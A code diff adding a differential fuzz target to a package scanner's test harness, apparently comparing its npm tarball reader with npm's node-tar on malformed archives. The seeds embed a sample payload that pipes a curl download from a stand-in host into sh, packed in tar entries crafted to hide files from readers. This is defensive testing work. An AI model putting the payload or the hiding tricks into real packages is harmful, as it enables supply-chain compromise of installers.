@@ -7,6 +7,10 @@ document, a broken promise (`check` raises `Violation`), or too much time (the d
 
 - `archive-tgz`, `archive-tbz2`, `archive-txz`, `archive-zip`: `registry.repo.iter_archive`, the reader of every
   package archive a registry scan, `lazaret guard` and `github:` scans open (tar by codec, and zip/wheel).
+- `archive-npm-diff`: the same reader on an npm tarball against what npm writes from it (BR-4): npm's own node-tar,
+  as pacote runs it (`npm_extract.cjs`, with the node on PATH and the npm beside it). A file npm writes is read,
+  under the path npm writes it at, or the reader calls the archive corrupt; and `registry.npmtar`, the reader's
+  model of npm's, says what npm writes. Without node and npm's node-tar it compares nothing.
 - `xml`, `xml-minidom`: `safexml.ElementTree.fromstring` and `safexml.minidom.parseString`, with the options the
   scanner uses and the limits it can be given.
 - `sca-*`: `scanner.sca.scan_all` over one file of each kind the inventory reads (the npm, yarn, pnpm and bun
@@ -231,6 +235,247 @@ register("archive-txz", "registry.repo.iter_archive on xz and lzma tarballs", tx
          archive_target("txz", (None, "npm")), TAR_WORDS, max_len=32768)
 register("archive-zip", "registry.repo.iter_archive on wheels and zip sdists", zip_seeds,
          archive_target("zip", (None, "wheel")), TAR_WORDS, max_len=32768)
+
+
+# ------------------------------------------------------------------------- npm's reading of a tarball (BR-4)
+
+NPM_EXTRACT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "npm_extract.cjs")
+EVIL_JS = b"require('child_process').exec('curl https://e.invalid/x | sh');\n"
+PJ = b'{"name": "x", "version": "1.0.0", "main": "index.js"}'
+
+
+def tar_header(name, size=0, typeflag=b"0", linkname=b"", magic=b"ustar\x0000", prefix=b"", size_field=None):
+    """A ustar header block, its checksum right, any field as given."""
+    b = bytearray(512)
+    b[0:len(name[:100])] = name[:100]
+    b[100:108] = b"0000644\x00"
+    b[108:116] = b"0000000\x00"
+    b[116:124] = b"0000000\x00"
+    b[124:136] = size_field if size_field is not None else b"%011o\x00" % size
+    b[136:148] = b"00000000000\x00"
+    b[156:157] = typeflag
+    b[157:157 + len(linkname[:100])] = linkname[:100]
+    b[257:265] = magic
+    b[345:345 + len(prefix[:155])] = prefix[:155]
+    b[148:156] = b" " * 8
+    b[148:156] = b"%06o\x00 " % sum(b)
+    return bytes(b)
+
+
+def tar_entry(name, data, **kw):
+    return tar_header(name, len(data), **kw) + data + b"\0" * (-len(data) % 512)
+
+
+def pax_record(key, value, off=0):
+    rest = b" " + key + b"=" + value + b"\n"
+    n = len(rest) + 1
+    while len(str(n).encode()) + len(rest) != n:
+        n += 1
+    return str(n + off).encode() + rest
+
+
+def fix_tar_checksums(data):
+    """Every block that looks like a header gets its checksum made right (so a change behind it is read)."""
+    buf = bytearray(data)
+    for at in range(0, len(buf) - 511, 512):
+        block = buf[at:at + 512]
+        if block[257:262] != b"ustar" and not block[148:156].strip(b"0 \x00").isdigit():
+            continue
+        block[148:156] = b" " * 8
+        buf[at + 148:at + 156] = b"%06o\x00 " % (sum(block) & 0o777777)
+    return bytes(buf)
+
+
+NPM_NAMES = [b"package/index.js", b"package/lib/a.js", b"index.js", b"/index.js", b"package//index.js",
+             b"package/./index.js", b"package/../index.js", b"package\\index.js", b"package/index.js/", b"package/",
+             b"package/index.js\x00junk", b"package/index.js\x00\n" + b"x" * 82, b"package/x\xe4.js",
+             b"package/x\xed\xa0\x80.js", b"package/caf\xc3\xa9.js", b"./package/index.js", b"package/index.js\r",
+             b"c:/package/index.js", b"package/C:index.js", b"package/" + b"d" * 92, b"package/.gitignore",
+             b"package/.npmignore", b"package/\\\\srv\\sh\\index.js"]
+NPM_TYPES = [b"0", b"\x00", b"7", b"5", b"1", b"2", b"x", b"g", b"L", b"K", b"N", b"X", b"S", b"D", b"Z", b"A", b"3",
+             b"6", b"\xff"]
+NPM_PAX = [b"package/index.js", b"package/p.js", b"package/a\n.js", b"12345", b"", b"package/\xe4.js", b"/index.js",
+           b"package/lib/../index.js"]
+
+
+def npm_generated(rng):
+    """A tarball built from the parts the readers disagree on (names, types, prefixes, pax records, long names)."""
+    parts = [tar_entry(b"package/package.json", PJ)]
+    for _ in range(rng.randint(1, 4)):
+        roll = rng.random()
+        payload = rng.choice([EVIL_JS, b"module.exports = 1;\n", b"", b"x" * rng.choice([1, 511, 512, 513, 1500])])
+        if roll < 0.25:
+            records = []
+            for _r in range(rng.randint(1, 3)):
+                key = rng.choice([b"path", b"size", b"linkpath", b"comment", b"mtime", b"SCHILY.dev", b"uid"])
+                value = rng.choice(NPM_PAX) if key in (b"path", b"linkpath") else rng.choice(
+                    [b"0", b"5", b"600", b"abc", b"-1", b" 7", b"1e3", b"999999999999"])
+                records.append(pax_record(key, value, rng.choice([0, 0, 0, 1, -1])))
+            parts.append(tar_entry(rng.choice([b"PaxHeader/x", b"pax_global_header", b"././@PaxHeader"]),
+                                   b"".join(records), typeflag=rng.choice([b"x", b"g", b"X"])))
+        elif roll < 0.35:
+            parts.append(tar_entry(b"././@LongLink", rng.choice(NPM_PAX) + rng.choice([b"\x00", b""]),
+                                   typeflag=rng.choice([b"L", b"K", b"N"])))
+        kw = {}
+        if rng.random() < 0.3:
+            kw["prefix"] = rng.choice([b"package", b"\x00" * 130 + b"x", b"pkg/sub", b"\x00x", b"a" * 155,
+                                       b"package\x00" + b"z" * 140])
+        if rng.random() < 0.2:
+            kw["magic"] = rng.choice([b"ustar\x0000", b"ustar  \x00", b"\x00" * 8, b"ustar\x00xx"])
+        if rng.random() < 0.15:
+            kw["linkname"] = rng.choice([b"x", b"index.js", b"../x"])
+        if rng.random() < 0.15:
+            kw["size_field"] = rng.choice([b"\x80" + b"\x00" * 10 + b"\x05", b"\xff" * 12, b"     12    \x00",
+                                           b"00000000012 ", b"12x\x00", b"\x81" + b"\x00" * 11, b"-0000000012\x00"])
+        typeflag = rng.choice(NPM_TYPES) if rng.random() < 0.4 else b"0"
+        parts.append(tar_entry(rng.choice(NPM_NAMES), payload, typeflag=typeflag, **kw))
+        if rng.random() < 0.1:
+            parts.append(b"\0" * 512 * rng.choice([1, 2]))
+    if rng.random() < 0.2:
+        rng.shuffle(parts)
+    return b"".join(parts) + b"\0" * 1024
+
+
+def npm_diff_seeds():
+    import random
+    found = [  # what the differential run found (each an archive the reader now calls corrupt)
+        tar_entry(b"package/package.json", PJ) + tar_entry(b"index.js", EVIL_JS, prefix=b"\x00" * 130 + b"x" * 25),
+        tar_entry(b"pax_global_header", pax_record(b"path", b"package/global.js"), typeflag=b"g")
+        + tar_entry(b"package/package.json", PJ) + tar_entry(b"package/index.js", EVIL_JS),
+        tar_entry(b"package/package.json", PJ) + tar_entry(b"package/docs/", tar_entry(b"package/index.js", EVIL_JS)),
+        tar_entry(b"package/package.json", PJ) + tar_entry(b"package/n.txt", tar_entry(b"package/index.js", EVIL_JS),
+                                                           linkname=b"x"),
+        tar_entry(b"package/package.json", PJ) + tar_entry(b"PaxHeader/x", pax_record(b"path", b"package/a\n.js"),
+                                                           typeflag=b"x") + tar_entry(b"package/index.js", EVIL_JS),
+        tar_entry(b"package/package.json", PJ) + tar_entry(b"././@LongLink", b"package/index.js\x00", typeflag=b"N")
+        + tar_entry(b"package/notes.js", EVIL_JS),
+        tar_entry(b"package/package.json", PJ) + tar_entry(b"package/x\xe4.js", EVIL_JS),
+        tar_entry(b"package/package.json", PJ) + tar_entry(b"package/a.js\x00\n" + b"b" * 86, EVIL_JS),
+        tar_entry(b"package/package.json", PJ) + tar_entry(b"package/\\\\srv\\sh\\index.js", EVIL_JS)]
+    rng = random.Random("archive-npm-diff seeds")
+    return ([f + b"\0" * 1024 for f in found] + tar_seeds()[:4] + [tar_bytes(NPM_FILES, tarfile.USTAR_FORMAT)]
+            + [npm_generated(rng) for _ in range(16)])
+
+
+def npm_predicted(data):
+    """What registry.npmtar says npm writes from this tar stream: {path: sha256}, a later entry over an earlier
+    one, a .gitignore as .npmignore unless one came first; None where it stops on what it does not follow."""
+    from lazaret.registry import npmtar
+    node = npmtar.NodeTar()
+    node.feed(data)
+    node.finish()
+    if any(code.startswith("LAZARET_") for code, _m in node.warnings) or node.dirs:
+        return None                                    # (a directory over a file, or a file over one: not modelled)
+    out, ignores = {}, set()
+    for path, start, size in node.files:
+        digest = hashlib.sha256(data[start:start + size]).hexdigest()
+        rel = npmtar.written_path(path)
+        if rel is None:
+            continue
+        base = rel.rsplit("/", 1)[-1]
+        if base == ".npmignore":
+            ignores.add(rel)
+        elif base == ".gitignore":
+            if rel[:-len(".gitignore")] + ".npmignore" in ignores:
+                continue
+            rel = rel[:-len(".gitignore")] + ".npmignore"
+        out[rel] = digest
+    if any(other.startswith(rel + "/") for rel in out for other in out):
+        return None
+    return out
+
+
+def npm_diff_start():
+    import subprocess
+    from lazaret.registry import repo
+    tmp = tempfile.mkdtemp(prefix="lz-npm-diff-")
+    state = {"proc": None}
+
+    def end(proc):
+        for pipe in (proc.stdin, proc.stdout):
+            try:
+                pipe.close()
+            except OSError:
+                pass
+        proc.kill()
+        proc.wait()
+
+    def spawn():
+        node = shutil.which("node")
+        if not node:
+            return None
+        proc = subprocess.Popen([node, NPM_EXTRACT], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                stderr=subprocess.DEVNULL, text=True, encoding="utf-8")
+        probe = os.path.join(tmp, "probe.tar")
+        with open(probe, "wb") as fh:
+            fh.write(tar_bytes(NPM_FILES[:2]))
+        try:
+            proc.stdin.write(json.dumps({"path": probe}) + "\n")
+            proc.stdin.flush()
+            answer = proc.stdout.readline()
+        except OSError:
+            answer = ""
+        if not answer:                                 # (npm's node-tar not found beside this node)
+            end(proc)
+            return None
+        return proc
+
+    def npm_writes(path):
+        proc = state["proc"]
+        try:
+            proc.stdin.write(json.dumps({"path": path}) + "\n")
+            proc.stdin.flush()
+            line = proc.stdout.readline()
+        except OSError:
+            line = ""
+        if not line:                                   # node-tar threw on it: npm's install fails there
+            end(proc)
+            state["proc"] = spawn()
+            return None
+        return json.loads(line)
+
+    state["proc"] = spawn()
+
+    def run(data):
+        if state["proc"] is None:
+            return
+        if zlib.crc32(data) % 2 == 0:
+            data = fix_tar_checksums(data)
+        path = os.path.join(tmp, "in.tar")
+        with open(path, "wb") as fh:
+            fh.write(data)
+        npm = npm_writes(path)
+        if npm is None or not npm["ok"]:
+            return
+        written = {rel: digest for rel, digest, _size in npm["files"] if digest != "other"}
+        predicted = npm_predicted(data)
+        if predicted is not None:
+            check(predicted == written, "npm-model", f"registry.npmtar says {sorted(predicted)[:6]}, npm writes "
+                                                     f"{sorted(written)[:6]}")
+        read, stopped = {}, False
+        for m in repo.iter_archive(data, "tgz", "npm", budget=repo.Budget(total=BUDGET_TOTAL)):
+            if m[3] is None:
+                read.setdefault(hashlib.sha256(bytes(m[2])).hexdigest(), set()).add(m[0])
+            else:
+                stopped = True
+        if stopped:
+            return
+        for rel, digest in written.items():
+            rels = read.get(digest)
+            check(rels, "npm-unread", f"npm writes {rel!r}, whose bytes the reader read nowhere")
+            names = {rel, rel[:-len(".npmignore")] + ".gitignore" if rel.endswith(".npmignore") else rel}
+            names |= {"/".join(p for p in n.replace("\\", "/").split("/") if p not in ("", ".")) for n in names}
+            check(names & rels, "npm-elsewhere", f"npm writes {rel!r}, the reader read its bytes as {sorted(rels)}")
+
+    def close():
+        if state["proc"] is not None:
+            end(state["proc"])
+        shutil.rmtree(tmp, ignore_errors=True)
+    return run, close
+
+
+register("archive-npm-diff", "registry.repo.iter_archive on npm tarballs against npm's own node-tar (BR-4)",
+         npm_diff_seeds, npm_diff_start, TAR_WORDS + (b"././@LongLink", b"\x00" * 130), max_len=32768)
 
 
 # ---------------------------------------------------------------------------------------------------- xml
